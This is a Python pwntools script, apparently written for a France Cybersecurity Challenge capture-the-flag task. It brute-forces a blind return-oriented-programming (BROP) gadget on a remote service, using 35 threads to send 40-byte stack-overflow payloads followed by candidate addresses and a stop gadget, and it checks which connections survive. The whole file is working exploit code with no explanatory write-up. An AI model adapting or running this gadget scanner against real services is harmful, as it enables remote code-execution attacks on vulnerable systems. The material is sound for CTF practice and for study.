from pwn import *

"""
Searching BROP gadget.
It has the following properties:
pops 6 addresses
pop rsi; pop 15; ret; at addr + 7
pop rdi; ret; at addr + 9
"""

_lock = threading.Lock()
stop_gadget = 0x400560


def get_next(it):
    with _lock:
        offset = next(it)
        return offset


# All address known to also trigger stop gadget
arr = [
    0x400560,
    0x400562,
    0x400563,
    0x400565,
    0x400567,
    0x400566,
    0x400569,
    0x40056e,
    0x40056d,
    0x40056f,
    0x400570,
    0x400577,
    0x400576,
    0x400656,
    0x400657,
    0x400658,
    0x40065a,
    0x40065e,
    0x4006b4,
    0x4006b5,
    0x4006b6,
    0x4006b8,
    0x4006bd,
    0x4006c2,
    0x4006c7,
    0x40073b]


def is_prompt_addr(addr):
    with _lock:
        return addr in arr


"""
Verifying the gadget at +7 and +9
"""
def verify_brop(addr):
    io = remote('challenges2.france-cybersecurity-challenge.fr', 4008, level='ERROR')
    io.recv(timeout=2)
    # Checking pop rsi
    io.send(b'a' * 40 + p64(addr + 7) + p64(0) * 2 + p64(stop_gadget))
    sleep(0.5)
    if not io.connected():
        return
    io = remote('challenges2.france-cybersecurity-challenge.fr', 4008, level='ERROR')
    io.recv(timeout=2)
    # Checking pop rdi
    io.send(b'a' * 40 + p64(addr + 9) + p64(0) + p64(stop_gadget))
    sleep(0.5)
    if not io.connected():
        return
    print("Possible BROP at", hex(addr))


def search_brop_gadget(it):
    while True:
        try:
            offset = get_next(it)
        except:
            return
        try:
            base = 0x400000
            # Skipping stop gadgets
            if is_prompt_addr(base + offset):
                continue
            time.sleep(0.2)
            if offset % 0x100 == 0:
                print("----- Scanning 0x%x" % offset)
            io = remote('challenges2.france-cybersecurity-challenge.fr', 4008, level='ERROR')
            io.recv(timeout=2)
            # Checking for addresses popping 6 addresses
            io.send(b'a' * 40 + p64(base + offset) + p64(0) * 6 + p64(stop_gadget))
            sleep(0.5)
            if io.connected():
                verify_brop(base + offset)
            io.close()
        except Exception as e:
            print(e)
            pass


iterator = iter(range(0x1000))
for i in range(35):
    threading.Thread(target=search_brop_gadget, args=(iterator,)).start()
    time.sleep(1)
